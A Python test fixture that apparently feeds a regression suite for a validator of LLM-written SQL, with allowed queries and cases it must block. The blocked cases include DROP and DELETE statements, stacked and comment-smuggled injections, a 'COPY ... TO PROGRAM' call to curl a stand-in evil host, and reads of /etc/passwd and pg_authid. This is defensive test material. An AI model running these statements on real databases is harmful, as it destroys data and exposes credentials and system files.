"""Fixed corpus for the cross-dialect golden regression suite.

Kept in one place so the snapshot generator and the assertion test use the exact
same inputs. Edit deliberately — changing the corpus changes the golden file.
"""

# Representative schema for allow-list checks.
ALLOW_LIST = {
    "orders": {"order_id", "customer_id", "amount", "status"},
    "customers": {"id", "name"},
}

# Target dialects the safe SQL is transpiled to (LLM writes Postgres).
DIALECTS = ["postgres", "mysql", "sqlite", "bigquery"]

# (case_id, sql) — a stable mix of ALLOW and BLOCK cases.
CORPUS: list[tuple[str, str]] = [
    # --- expected ALLOW (transpilation snapshot matters here) ---
    ("allow_scalar", "SELECT amount FROM orders"),
    ("allow_group", "SELECT status, SUM(amount) AS total FROM orders "
                    "GROUP BY status ORDER BY total DESC"),
    ("allow_join", "SELECT c.name, SUM(o.amount) AS total FROM orders o "
                   "JOIN customers c ON o.customer_id = c.id GROUP BY c.name"),
    ("allow_limit_present", "SELECT amount FROM orders LIMIT 5"),
    ("allow_limit_clamp", "SELECT amount FROM orders LIMIT 999999"),
    ("allow_cte", "WITH t AS (SELECT amount FROM orders) SELECT * FROM t"),
    ("allow_union", "SELECT amount FROM orders UNION SELECT amount FROM orders"),
    ("allow_quoted", 'SELECT "amount" FROM "orders"'),
    # --- expected BLOCK (verdict must be identical across dialects) ---
    ("block_drop", "DROP TABLE orders"),
    ("block_delete", "DELETE FROM orders"),
    ("block_update", "UPDATE orders SET amount = 0"),
    ("block_truncate", "TRUNCATE orders"),
    ("block_create", "CREATE TABLE x AS SELECT * FROM orders"),
    ("block_grant", "GRANT ALL ON orders TO attacker"),
    ("block_multi", "SELECT 1; DROP TABLE orders"),
    ("block_comment_smuggle", "SELECT 1 /* ok */; DELETE FROM orders"),
    ("block_write_cte",
     "WITH x AS (DELETE FROM orders RETURNING *) SELECT * FROM x"),
    ("block_select_into", "SELECT * INTO backup FROM orders"),
    ("block_copy", "COPY orders TO PROGRAM 'curl evil.example'"),
    ("block_pg_sleep", "SELECT pg_sleep(5)"),
    ("block_read_file", "SELECT pg_read_file('/etc/passwd')"),
    ("block_syscatalog", "SELECT * FROM pg_catalog.pg_authid"),
    ("block_info_schema", "SELECT table_name FROM information_schema.tables"),
    ("block_unknown_table", "SELECT * FROM employee_payroll"),
    ("block_unknown_column", "SELECT customer_password FROM orders"),
    ("block_case_obfuscation", "dRoP tAbLe orders"),
]
